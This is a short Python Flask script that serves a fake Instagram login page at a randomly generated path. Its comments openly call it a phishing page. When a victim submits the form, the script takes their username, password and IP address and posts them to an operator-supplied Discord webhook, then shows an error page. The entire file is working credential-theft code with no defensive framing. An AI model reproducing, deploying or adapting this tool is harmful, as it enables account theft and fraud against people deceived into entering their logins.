import os
import random
import string
from flask import Flask, request, render_template
import requests

# CONFIGURATION
WEBHOOK_URL = "https://discord.com/api/webhooks/your-webook-url"  # Change this to your webhook
PORT = 5000  # Change if needed
TEMPLATE_FOLDER = "templates"  

app = Flask(__name__, template_folder=TEMPLATE_FOLDER)

# Generate a random phishing URL path (e.g., /login-abx123)
def random_string(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

PHISHING_PATH = random_string()

@app.route(f'/{PHISHING_PATH}', methods=["GET", "POST"])
def phishing_page():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        if username and password:
            log_data = {
                "platform": "Instagram",
                "username": username,
                "password": password,
                "ip": request.remote_addr
            }
            # Send logs to webhook
            requests.post(WEBHOOK_URL, json=log_data)

        return render_template("error.html")  # Redirect to error page

    return render_template("instagram_login.html")  # Load Instagram fake login page

if __name__ == "__main__":
    print(f"Instagram phishing page running at: http://127.0.0.1:{PORT}/{PHISHING_PATH}")
    app.run(host="0.0.0.0", port=PORT)
